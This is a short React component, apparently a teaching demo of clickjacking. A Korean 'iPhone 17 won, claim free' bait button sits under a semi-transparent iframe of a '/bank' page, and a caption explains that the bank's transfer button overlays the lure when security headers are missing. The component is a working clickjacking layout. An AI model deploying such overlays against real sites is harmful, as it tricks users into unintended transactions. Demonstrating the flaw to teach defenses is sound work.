export default function HackerPage() {
  return (
    <main className="relative w-full max-w-sm h-[500px] bg-yellow-300 border-4 border-yellow-500 rounded-xl overflow-hidden flex flex-col items-center justify-center">
      <h1 className="text-3xl font-black text-red-600 mb-8 animate-bounce">🎉 아이폰 17 당첨! 🎉</h1>
      <button className="absolute z-10 px-8 py-4 bg-blue-600 text-white text-xl font-bold rounded-full pointer-events-none">
        무료 수령 확인하기 클릭!
      </button>
      <iframe src="/bank" className="absolute top-0 left-0 w-full h-full z-20 opacity-50"></iframe>
      <p className="absolute bottom-4 text-sm font-bold text-gray-800 text-center px-2">
        (보안 헤더가 없다면 반투명한 은행 송금 버튼이 미끼 버튼 위에 겹쳐 보입니다!)
      </p>
    </main>
  );
}
